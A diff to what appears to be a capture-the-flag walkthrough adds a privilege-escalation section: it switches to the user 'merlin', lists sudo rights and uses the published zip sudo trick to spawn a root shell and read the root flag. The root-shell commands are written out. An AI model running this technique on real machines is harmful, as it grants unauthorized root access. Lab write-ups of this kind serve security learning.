@@ -221,5 +221,36 @@ cat /home/merlin/user.txt
 
 ## Previlege Escalation
 
+9. So apparently we cant run ```sudo -l``` in ```skyfuck```. So I guess this marks the end of our journey with ```skyfuck```.
+```
+skyfuck@ubuntu:~$ sudo -l
+[sudo] password for skyfuck: 
+```
 
+- Lets switch user to ```merlin```:
+```bash
+skyfuck@ubuntu:~$ su - merlin
+Password: 
+merlin@ubuntu:~$ 
+```
+
+10. Yup, we can see ```sudo -l``` now:
+```
+merlin@ubuntu:~$ sudo -l
+Matching Defaults entries for merlin on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User merlin may run the following commands on ubuntu:
+    (root : root) NOPASSWD: /usr/bin/zip
+```
+
+11. According to [GTFObin](https://gtfobins.github.io/gtfobins), we can run this to maintain root:
+```bash
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+sudo rm $TF
+```
+
+12. We can then go to ```cd /root``` and ```cat``` the root flag.
 
